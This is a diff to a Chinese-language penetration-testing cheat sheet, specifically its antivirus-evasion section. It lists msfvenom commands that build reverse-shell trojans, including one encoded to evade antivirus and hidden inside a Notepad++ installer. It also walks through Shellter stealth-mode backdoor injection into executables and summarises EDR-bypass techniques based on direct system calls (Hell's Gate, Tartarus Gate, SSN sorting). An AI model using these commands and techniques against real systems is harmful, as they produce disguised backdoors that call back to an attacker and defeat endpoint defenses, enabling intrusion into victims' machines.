@@ -94,34 +94,47 @@ netstat
 
 免杀
 -----------------------------------------
-- MSF制作免杀木马
-	- 列出所有可用编码
-		``msfvemon -l encoders``
-	- 裸奔木马
-		``msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=1234 -f exe > /root/test.exe``
-	- 免杀木马
-		``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.20.2 LPORT=3333 -e x86/shikata_ga_nai -x npp.7.8.6.Installer.exe -i 12 -f exe -o /root/npp1.exe``
+- 核心技术：分离执行和加密混淆等技术
+- 免杀加载器
+    + venom/msfvenom
+        - venom生成其实是直接调用的msfvenom
+        - 支持生成多平台payload，比如android、ios、linux/unix、office等等
+        - 列出所有可用编码
+            ``msfvemon -l encoders``
+        - 裸奔木马
+            ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=1234 -f exe > /root/test.exe``
+        - 免杀木马
+            ``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.20.2 LPORT=3333 -e x86/shikata_ga_nai -x npp.7.8.6.Installer.exe -i 12 -f exe -o /root/npp1.exe``
 
-	|msfvemon1|
+        |msfvemon1|
+    + Shellter动态注入工具
+        - 下载地址：https://www.shellterproject.com/download/
+        - Choose Operation Mode - Auto/Manual (A/M/H)
+            选择模式: 自动模式自动注入后门，M高级模式，H帮助
+        - PE Target：
+            注入的程序.
+        - Enable Stealth Mode?
+            是否启用隐身模式
+        - Use a listed payload or custom? (L/C/H)
+            使用攻击模块列表或者自定义
+        - Select payload by index:
+            选择payload序号
+        - SET LHOST
+            设置反弹回来的IP 本机
+        - SET LPORT
+            设置接收反弹的端口
+    + veil
+- 防御EDR检测
+    + 地狱之门
+        - 原理：避免在用户层被EDR hook的敏感函数检测到敏感行为，利用从ntdll中读取到的系统调用号进行系统直接调用来绕过敏感API函数的hook。
+        - 相关项目：https://github.com/am0nsec/HellsGate
+    + 光环之门
+        - 原理：
+        - 相关项目：https://github.com/trickster0/TartarusGate
+        - 相关资料：https://blog.vincss.net/2020/03/re011-unpack-crypter-cua-malware-netwire-bang-x64dbg.html
+    + SSN系统调用地址排序
+        - 原理：ntdll.dll中的特性就是所有的Zw函数是根据函数地址的大小来进行排序的，所以我们就只需要遍历所有Zw函数，记录其函数名和函数地址，最后将其按照函数地址升序排列后，每个函数的调用号就是其对应的排列顺序的索引号。
 
-- Shellter动态注入工具
-	- 下载地址
-		``https://www.shellterproject.com/download/``
-	- Choose Operation Mode - Auto/Manual (A/M/H)
-		选择模式: 自动模式自动注入后门，M高级模式，H帮助
-	- PE Target：
-		注入的程序.
-	- Enable Stealth Mode?
-		是否启用隐身模式
-	- Use a listed payload or custom? (L/C/H)
-		使用攻击模块列表或者自定义
-	- Select payload by index:
-		选择payload序号
-	- SET LHOST
-		设置反弹回来的IP 本机
-	- SET LPORT
-		设置接收反弹的端口
-		
 提权
 -----------------------------------------
 - PEASS-ng
